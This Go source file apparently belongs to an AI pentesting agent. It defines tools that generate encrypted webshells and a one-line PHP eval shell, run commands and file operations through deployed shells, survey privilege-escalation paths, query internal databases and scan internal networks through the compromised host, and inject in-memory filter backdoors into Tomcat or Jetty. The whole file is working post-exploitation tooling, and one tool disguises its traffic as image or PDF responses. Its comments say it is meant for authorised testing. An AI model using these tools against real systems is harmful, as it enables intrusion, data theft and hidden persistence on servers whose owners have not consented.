package agent

// tools_webshell.go — webshell 生成与连接工具（移植自 AI-PENTEST webshell 模块）。
// webshell_gen：按 语言×编码器 生成服务端 shell 文件（蚁剑 raw / 冰蝎 aes / 哥斯拉 xor / 一句话 form-cmd）。
// webshell_exec：对已部署的 shell 发加密请求执行命令/文件操作，__WS_*__ 标记协议解析。

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/Autumn-27/artex/webshell"
	actool "github.com/Autumn-27/norma/tool"
)

// wsWorkDir webshell 文件落盘目录（优先任务 droidDir，缺省系统临时目录）。
func (t *ToolSet) wsWorkDir() string {
	if t.droidDir != "" {
		return filepath.Join(t.droidDir, "webshells")
	}
	return filepath.Join(os.TempDir(), "forang-webshells")
}

func (t *ToolSet) webshellGen() actool.CoreTool {
	return writeTool("webshell_gen",
		"生成 webshell 服务端文件。组合：语言 php/jsp/jspx/py/node 支持 raw(蚁剑)/aes(冰蝎3.0)/xor(哥斯拉)；asp/aspx 仅 raw。form-cmd 编码器不生成文件（配合一句话 `<?php eval($_POST['cmd']); ?>` 使用）。文件落盘到任务工作目录 webshells/ 下，同时返回完整代码供落地。",
		obj(map[string]any{
			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node"),
			"encoder":     str("编码器：raw / aes / xor（asp/aspx 仅 raw）"),
			"password":    str("连接密码（aes/xor 用其 md5 派生密钥）"),
			"filename":    str("可选：输出文件名，缺省 shell.<扩展名>"),
			"carrier":     str("可选：''/script=普通脚本 shell（默认）；java=Java 动态载荷载体（仅 jsp/jspx，目标端只需 JRE8+，不依赖脚本引擎）"),
		}, "script_type", "encoder", "password"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				ScriptType string `json:"script_type"`
				Encoder    string `json:"encoder"`
				Password   string `json:"password"`
				Filename   string `json:"filename"`
				Carrier    string `json:"carrier"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(a.Password) == "" {
				return actool.Errorf("password 必填"), nil
			}
			genCarrier := a.Carrier
			if genCarrier == "java" {
				genCarrier = "java"
			}
			var code string
			var err error
			if genCarrier == "java" {
				code, err = webshell.GenerateJavaCarrier(a.ScriptType, a.Encoder, a.Password)
			} else {
				code, err = webshell.GenerateShell(a.ScriptType, a.Encoder, a.Password)
			}
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			name := a.Filename
			if strings.TrimSpace(name) == "" {
				name = "shell." + webshell.FileExt(a.ScriptType)
			}
			name = filepath.Base(name) // 防路径穿越
			dir := t.wsWorkDir()
			if err := os.MkdirAll(dir, 0o700); err != nil {
				return actool.Errorf("创建输出目录失败: " + err.Error()), nil
			}
			p := filepath.Join(dir, name)
			if err := os.WriteFile(p, []byte(code), 0o600); err != nil {
				return actool.Errorf("写文件失败: " + err.Error()), nil
			}
			t.recordAction("webshell_gen", fmt.Sprintf("生成 %s/%s webshell（%d 字节）", a.ScriptType, a.Encoder, len(code)), map[string]any{
				"script_type": a.ScriptType, "encoder": a.Encoder, "filename": name, "result": "ok",
			})
			return actool.Text(fmt.Sprintf("✅ webshell 已生成：%s（%s/%s，%d 字节）\n连接参数：url=<部署地址> password=%q encoder=%s script_type=%s\n部署后用 webshell_exec 验证（先 op=test）。\n---- 文件内容 ----\n%s",
				p, a.ScriptType, a.Encoder, len(code), a.Password, a.Encoder, a.ScriptType, code)), nil
		})
}

func (t *ToolSet) webshellExec() actool.CoreTool {
	return writeTool("webshell_exec",
		"连接已部署的 webshell 执行操作。op：exec(默认，执行命令)/test(连通性探测)/list(列目录)/read(读文件)/write(写文件)。自动按 encoder 加密（raw=蚁剑/aes=冰蝎/xor=哥斯拉/form-cmd=一句话），响应按 __WS_*__ 标记解析出输出与 cwd。授权测试场景专用。",
		obj(map[string]any{
			"url":         str("webshell 完整 URL"),
			"password":    str("连接密码（form-cmd 时可用 'field:xxx' 指定字段名，默认 cmd）"),
			"encoder":     str("编码器：raw / aes / xor / form-cmd，默认 raw"),
			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node，默认 php"),
			"op":          str("操作：test / exec / list / read / write，默认 exec"),
			"cmd":         str("op=exec 时的命令"),
			"path":        str("op=list/read/write 的目标路径"),
			"content":     str("op=write 的文本内容（二进制用 content_b64）"),
			"content_b64": str("op=write 写二进制时的 base64 数据"),
			"cwd":         str("可选：exec 的工作目录（shell 端 chdir）"),
			"carrier":     str("可选：''/script=普通脚本 shell（默认）；java=Java 动态载荷载体（仅 jsp/jspx，仅支持 test/exec/info）"),
			"disguise":    str("可选：响应体伪装链 png/pdf/gif，空=裸密文（目标端载体需支持对应链）"),
			"timeout":     intp("可选：HTTP 超时秒数，默认 30"),
		}, "url", "password"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				URL        string `json:"url"`
				Password   string `json:"password"`
				Encoder    string `json:"encoder"`
				ScriptType string `json:"script_type"`
				Op         string `json:"op"`
				Cmd        string `json:"cmd"`
				Path       string `json:"path"`
				Content    string `json:"content"`
				ContentB64 string `json:"content_b64"`
				Cwd        string `json:"cwd"`
				Carrier    string `json:"carrier"`
				Disguise   string `json:"disguise"`
				Timeout    int    `json:"timeout"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Password) == "" {
				return actool.Errorf("url 与 password 必填"), nil
			}
			if a.Encoder == "" {
				a.Encoder = "raw"
			}
			if a.ScriptType == "" {
				a.ScriptType = "php"
			}
			if a.Op == "" {
				a.Op = "exec"
			}
			cli := &webshell.Client{
				URL: a.URL, Password: a.Password, Encoder: a.Encoder, ScriptType: a.ScriptType,
				Cwd: a.Cwd, Timeout: time.Duration(a.Timeout) * time.Second,
				Carrier: a.Carrier, Disguise: a.Disguise,
				Proxy: t.egressProxyFor(a.URL), // 测试网络出口：内网目标经 socks5/http 出口
			}
			if a.Timeout <= 0 {
				cli.Timeout = 30 * time.Second
			}
			params := webshell.P{Cmd: a.Cmd, Cwd: a.Cwd, Path: a.Path, Content: a.Content, B64Data: a.ContentB64}
			res, err := cli.RoundTrip(a.Op, params)
			if err != nil {
				t.recordAction("webshell_exec", "Webshell 调用失败（"+a.Op+"）", map[string]any{
					"target": a.URL, "op": a.Op, "cmd": truncateStr(a.Cmd, 200), "result": "fail", "error": truncateStr(err.Error(), 200),
				})
				return actool.Errorf("webshell 调用失败: " + err.Error()), nil
			}
			var b strings.Builder
			if !res.OK {
				fmt.Fprintf(&b, "❌ op=%s 失败：%s", a.Op, res.Error)
				t.recordAction("webshell_exec", "Webshell "+a.Op+" 失败", map[string]any{
					"target": a.URL, "op": a.Op, "cmd": truncateStr(a.Cmd, 200), "result": "fail", "error": truncateStr(res.Error, 200),
				})
				return actool.Text(b.String()), nil
			}
			// 动作入图：每次成功的 shell 操作都成为链路图上的 action 节点。
			actionSum := "Webshell " + a.Op
			switch a.Op {
			case "test":
				actionSum = "Webshell 存活探测（PONG）"
			case "exec":
				actionSum = "Webshell 执行命令：" + truncateStr(strings.Join(strings.Fields(a.Cmd), " "), 80)
			case "list":
				actionSum = "Webshell 列目录：" + truncateStr(a.Path, 80)
			case "read":
				actionSum = "Webshell 读文件：" + truncateStr(a.Path, 80)
			case "write":
				actionSum = "Webshell 写文件：" + truncateStr(a.Path, 80)
			}
			t.recordAction("webshell_exec", actionSum, map[string]any{
				"target": a.URL, "op": a.Op, "cmd": truncateStr(a.Cmd, 200),
				"result": "ok", "encoder": a.Encoder,
			})
			switch a.Op {
			case "test":
				fmt.Fprintf(&b, "✅ shell 存活（PONG nonce=%s）", res.Output)
			case "exec":
				out := res.Output
				if len(out) > 8000 {
					out = out[:8000] + "\n...(截断，共 " + fmt.Sprint(len(res.Output)) + " 字符)"
				}
				b.WriteString("✅ 命令输出：\n" + out)
				if res.CWD != "" {
					b.WriteString("\n[cwd] " + res.CWD)
				}
			case "list":
				b.WriteString("✅ 目录列表（JSON，字段 name/size/is_dir/mtime）：\n" + strings.TrimSpace(res.Output))
			case "read":
				saved := ""
				if a.Path != "" {
					local := filepath.Join(t.wsWorkDir(), "download_"+filepath.Base(strings.ReplaceAll(a.Path, "\\", "/")))
					if err := os.MkdirAll(t.wsWorkDir(), 0o700); err == nil {
						if err := os.WriteFile(local, res.Data, 0o600); err == nil {
							saved = "（已存本地：" + local + "）"
						}
					}
				}
				preview := res.Data
				if len(preview) > 2000 {
					preview = preview[:2000]
				}
				if isTexty(preview) {
					fmt.Fprintf(&b, "✅ 读取 %d 字节%s：\n%s", len(res.Data), saved, string(preview))
				} else {
					fmt.Fprintf(&b, "✅ 读取 %d 字节（二进制）%s", len(res.Data), saved)
				}
			case "write":
				b.WriteString("✅ 写入成功：" + a.Path)
			default:
				b.WriteString("✅ 完成：" + strings.TrimSpace(res.Output))
			}
			return actool.Text(b.String()), nil
		})
}

// wsClientFrom 按工具入参构造连接（gen 之外的 exec/plugin/privesc 共用同一套字段语义）。
func (t *ToolSet) wsClientFrom(c wsConn) *webshell.Client {
	timeout := time.Duration(c.Timeout) * time.Second
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	return &webshell.Client{
		URL: c.URL, Password: c.Password, Encoder: c.Encoder, ScriptType: c.ScriptType,
		Cwd: c.Cwd, Timeout: timeout,
		Carrier: c.Carrier, Disguise: c.Disguise,
		Proxy: t.egressProxyFor(c.URL), // 测试网络出口：内网目标经 socks5/http 出口
	}
}

// wsConn 各 tool 共用的连接字段。
type wsConn struct {
	URL        string `json:"url"`
	Password   string `json:"password"`
	Encoder    string `json:"encoder"`
	ScriptType string `json:"script_type"`
	Cwd        string `json:"cwd"`
	Carrier    string `json:"carrier"`
	Disguise   string `json:"disguise"`
	Timeout    int    `json:"timeout"`
}

func (c *wsConn) normalize() {
	if c.Encoder == "" {
		c.Encoder = "raw"
	}
	if c.ScriptType == "" {
		c.ScriptType = "php"
	}
}

// webshellPrivesc 提权面分析：只读采集目标的可提权面，输出结构化结论。
//
// 这里刻意不内置 Potato / 各类 exp：授权状态不明会污染 AGPL 分发，落地也基本必被查杀。
// 平台负责「判断哪条路可走」，具体利用由 Agent 下一步决定。
func (t *ToolSet) webshellPrivesc() actool.CoreTool {
	return writeTool("webshell_privesc",
		"对 webshell 目标做提权面分析（全部只读，不改目标状态）：识别系统与运行账号、SUID/sudo 配置、可写敏感路径、计划任务、docker.sock、内核版本、Windows 令牌权限与服务路径等，返回风险分级结论。不内置任何 exp，利用方式由你根据结论决定。适用于 php/jsp 脚本载体与 java 动态载荷。",
		obj(map[string]any{
			"url":         str("webshell 完整 URL"),
			"password":    str("连接密码"),
			"encoder":     str("编码器：raw / aes / xor / form-cmd，默认 raw"),
			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node，默认 php"),
			"carrier":     str("载体：''/script 普通脚本 shell；java Java 动态载荷"),
			"disguise":    str("可选：响应体伪装链 png/pdf/gif"),
			"timeout":     intp("可选：单条命令超时秒数，默认 30"),
		}, "url", "password"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a wsConn
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Password) == "" {
				return actool.Errorf("url 与 password 必填"), nil
			}
			a.normalize()
			rep, err := webshell.RunPrivesc(t.wsClientFrom(a))
			if err != nil {
				t.recordAction("webshell_privesc", "提权面分析失败", map[string]any{
					"target": a.URL, "result": "fail", "error": truncateStr(err.Error(), 200),
				})
				return actool.Errorf("提权面分析失败: " + err.Error()), nil
			}
			crit := 0
			for _, f := range rep.Findings {
				if f.Risk == "critical" || f.Risk == "high" {
					crit++
				}
			}
			t.recordAction("webshell_privesc", fmt.Sprintf("提权面分析（%s，%d 条线索 / %d 条高危）", rep.OS, len(rep.Findings), crit), map[string]any{
				"target": a.URL, "os": rep.OS, "user": rep.User, "findings": len(rep.Findings), "high": crit, "result": "ok",
			})
			return actool.Text(fmt.Sprintf("✅ 提权面分析完成：%s %s（%d 条线索，其中 high/critical %d 条）\n注意：以下均为只读采集结论，未做任何利用。\n\n%s",
				rep.OS, rep.Host, len(rep.Findings), crit, rep.Text)), nil
		})
}

// webshellPlugin 插件通道：数据库 / 内网扫描 / 进程 / 内存马。
//
// 与 webshell_exec 的分工：exec 走命令执行（受目标系统有没有对应命令限制），
// 这里走「在目标进程内跑代码」的插件通道——没装 netstat 也能列连接、
// 没装 mysql 客户端也能直连数据库、把内存马挂进容器不回写任何文件。
func (t *ToolSet) webshellPlugin() actool.CoreTool {
	return writeTool("webshell_plugin",
		"在已部署的 webshell 上执行插件（等价于控制台插件面板）。op 取值：db_exec(以目标身份直连其内网数据库执行 SQL)/db_probe(探测目标 classpath 上可用的 JDBC 驱动)/net_scan(以目标为跳板扫描内网端口)/net_list(列目标本机 TCP 连接，不依赖 netstat)/proc_list(进程列表，Linux 读 /proc、Windows 走 tasklist)/servlet_list(枚举 Servlet/Filter 注册与映射，看过滤器链与暴露的管理端点)/jar_load(目标机上已有 jar 的动态装载与驱动探测)/screenshot(截屏，headless 服务器会如实报不可用)/memshell_add_filter(注入内存马)/memshell_list(列已注入内存马)/memshell_del(卸载内存马；注入只有 Tomcat/Jetty 有专用路径，Undertow 这类容器已实测拒绝运行期注册 Filter（UT010041），会如实报错，别反复重试)。carrier=java 时同样可用（载荷内已用 JDK 自带 API 重写）：db 若目标 classpath 没驱动，用 jar_path 指向目标机上的驱动 jar（可逗号分隔多个，驱动包常依赖 slf4j），载荷会绕过 DriverManager 直接 driver.connect。授权测试场景专用。",
		obj(map[string]any{
			"url":         str("webshell 完整 URL"),
			"password":    str("连接密码"),
			"encoder":     str("编码器：raw / aes / xor / form-cmd，默认 raw"),
			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node，默认 php"),
			"carrier":     str("载体：''/script 普通脚本 shell；java Java 动态载荷"),
			"disguise":    str("可选：响应体伪装链 png/pdf/gif"),
			"op":          str("插件操作：db_exec / db_probe / net_scan / net_list / proc_list / memshell_add_filter / memshell_list / memshell_del"),
			"db_type":     str("op=db_exec 的库类型：mysql / pgsql / sqlite / sqlserver / oracle"),
			"host":        str("op=db_exec 的数据库地址（相对目标机）"),
			"port":        str("op=db_exec 的数据库端口"),
			"user":        str("op=db_exec 的用户名"),
			"pass":        str("op=db_exec 的密码"),
			"db":          str("op=db_exec 的库名（sqlite 时为文件路径）"),
			"sql":         str("op=db_exec 的 SQL"),
			"scan_host":   str("op=net_scan 的目标 host/IP（内网）"),
			"scan_ports":  str("op=net_scan 的端口，逗号分隔，支持 a-b 区间"),
			"filter_name": str("op=memshell_* 的 Filter 名"),
			"gate_header": str("op=memshell_add_filter 的门禁请求头名"),
			"gate_value":  str("op=memshell_add_filter 的门禁请求头值"),
			"filter":      str("op=proc_list 的过滤词（纯数字按 PID 精确匹配，否则按命令行/进程名模糊匹配）"),
			"jar_path":    str("op=db_exec/jar_load 用：目标机上的 jar 路径（多个用逗号分隔）；db_exec 用它加载 classpath 外的 JDBC 驱动"),
			"timeout":     intp("可选：HTTP 超时秒数，默认 60（数据库/扫描可能慢）"),
		}, "url", "password", "op"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				wsConn
				Op         string `json:"op"`
				DBType     string `json:"db_type"`
				Host       string `json:"host"`
				Port       string `json:"port"`
				User       string `json:"user"`
				Pass       string `json:"pass"`
				DB         string `json:"db"`
				SQL        string `json:"sql"`
				ScanHost   string `json:"scan_host"`
				ScanPorts  string `json:"scan_ports"`
				FilterName string `json:"filter_name"`
				GateHeader string `json:"gate_header"`
				GateValue  string `json:"gate_value"`
				Filter     string `json:"filter"`
				JarPath    string `json:"jar_path"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Password) == "" {
				return actool.Errorf("url 与 password 必填"), nil
			}
			if strings.TrimSpace(a.Op) == "" {
				return actool.Errorf("op 必填（db_exec/net_scan/net_list/proc_list/memshell_*）"), nil
			}
			a.normalize()
			// Java 载体只认字节码：先在本地拦掉没有等价实现的插件，别白跑一趟网络
			if a.Carrier == "java" && !webshell.JavaExtSupported(a.Op) {
				return actool.Errorf(fmt.Sprintf("Java 载体不支持 %q：可用 db_exec/db_probe/net_scan/net_list/proc_list/servlet_list/jar_load/screenshot/memshell_*（压缩仍是脚本载体专属）", a.Op)), nil
			}
			// 参数前置校验：这些错误在目标端报出来往往只有一句「执行失败」，看不出是哪错了
			switch a.Op {
			case "db_exec":
				if strings.TrimSpace(a.SQL) == "" {
					return actool.Errorf("op=db_exec 需要 sql"), nil
				}
			case "net_scan":
				if strings.TrimSpace(a.ScanHost) == "" || strings.TrimSpace(a.ScanPorts) == "" {
					return actool.Errorf("op=net_scan 需要 scan_host 与 scan_ports"), nil
				}
			case "memshell_add_filter":
				if strings.TrimSpace(a.FilterName) == "" {
					a.FilterName = "forangFilter"
				}
				if strings.TrimSpace(a.GateHeader) == "" || a.GateValue == "" {
					return actool.Errorf("op=memshell_add_filter 需要 gate_header 与 gate_value（没有门禁就等于给目标开了个后门）"), nil
				}
			}
			cli := t.wsClientFrom(a.wsConn)
			if cli.Timeout <= 30*time.Second {
				cli.Timeout = 60 * time.Second // 插件比 exec 慢：数据库连接、端口扫描都要时间
			}
			p := webshell.ExtParams{
				DBType: a.DBType, Host: a.Host, Port: a.Port, User: a.User, Pass: a.Pass,
				DB: a.DB, SQL: a.SQL, ScanHost: a.ScanHost, ScanPorts: a.ScanPorts,
				FilterName: a.FilterName, GateHeader: a.GateHeader, GateValue: a.GateValue,
				Cmd: a.Filter, JarPath: a.JarPath,
			}
			res, err := cli.RoundTripExt(a.Op, p)
			if err != nil {
				t.recordAction("webshell_plugin", "插件失败（"+a.Op+"）", map[string]any{
					"target": a.URL, "op": a.Op, "result": "fail", "error": truncateStr(err.Error(), 200),
				})
				return actool.Errorf("插件执行失败: " + err.Error()), nil
			}
			if !res.OK {
				t.recordAction("webshell_plugin", "插件返回失败（"+a.Op+"）", map[string]any{
					"target": a.URL, "op": a.Op, "result": "fail", "error": truncateStr(res.Error, 200),
				})
				return actool.Text("❌ op=" + a.Op + " 失败：" + res.Error), nil
			}
			out := strings.TrimSpace(res.Output)
			if len(out) > 12000 {
				out = out[:12000] + "\n...(截断，共 " + fmt.Sprint(len(res.Output)) + " 字符)"
			}
			t.recordAction("webshell_plugin", "Webshell 插件："+a.Op, map[string]any{
				"target": a.URL, "op": a.Op, "result": "ok",
				"host": a.ScanHost, "sql": truncateStr(a.SQL, 200), "ports": truncateStr(a.ScanPorts, 100),
			})
			return actool.Text("✅ op=" + a.Op + " 完成：\n" + out), nil
		})
}

// isTexty 粗判字节是否为可打印文本（供 read 预览）。
func isTexty(b []byte) bool {
	n := 0
	for _, c := range b {
		if c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c < 0x7f) || c >= 0x80 {
			n++
		}
	}
	return len(b) == 0 || n*10 >= len(b)*9
}
